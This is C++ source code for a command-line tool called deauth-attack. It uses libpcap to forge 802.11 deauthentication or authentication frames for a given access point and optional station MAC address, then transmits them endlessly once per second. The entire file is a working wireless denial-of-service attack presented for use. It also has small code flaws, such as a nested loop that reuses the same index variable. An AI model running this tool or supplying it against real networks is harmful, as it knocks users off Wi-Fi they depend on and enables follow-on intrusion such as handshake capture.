#include <iostream>
#include <string>
#include <stdio.h>
#include <header.h>

struct Deauth_packet {
    Radiotaps r_tap;
    Deauth_frame d_frame;
    fixed_param f_param;
};

void usage()
{
    std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]" << std::endl;
    std::cout << "sample : deauth-attack mon0 11:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
}

struct Param {
    bool auth   { false };
    void parse(int argc, char* argv[]) {
        for (int i = 1; i < argc; i++) {
            if (strcmp(argv[i], "-auth") == 0) {
                auth = true;
                break;
            }
        }
        if(auth && argc != 5) {
            std::cout << "Please input station mac address\n" << std::endl;
            exit(-1);
        }
    }
} param;

int main(int argc, char *argv[])
{
    if(argc < 3 || argc > 5) {
        usage();
        return 0;
    }

    param.parse(argc, argv);

    bool get_sta_mac = false;
    if((param.auth && argc == 5) || (!param.auth && argc == 4)) {
        get_sta_mac = true;
    }

    char* interface = argv[1];

    int i = 0;
    uint8_t ap_mac[MAC_ADDR_LEN];

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
            return -1;
    }

    Deauth_packet packets;
    for(i=0; i<MAC_ADDR_LEN; i++) {

        if(param.auth) {
            packets.d_frame.type = 0xb0;
        }

        for(i=0; i<MAC_ADDR_LEN; i++) {
            ap_mac[i] = strtol(argv[2], NULL, 16);
            argv[2] += 3;

            packets.d_frame.trans_src_addr[i] = ap_mac[i];
            if(!param.auth) { packets.d_frame.bssid[i] = ap_mac[i]; }
        }

        if(get_sta_mac) {
            uint8_t sta_mac[MAC_ADDR_LEN];
            for(i=0; i<MAC_ADDR_LEN; i++) {
                sta_mac[i] = strtol(argv[3], NULL, 16);
                argv[3] += 3;

                packets.d_frame.recv_dst_addr[i] = sta_mac[i];
                if(param.auth) { packets.d_frame.bssid[i] = sta_mac[i]; }
            }
        }
    }

    while(true) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packets), sizeof(Deauth_packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        sleep(1);
    }

    pcap_close(handle);

    return 0;
}
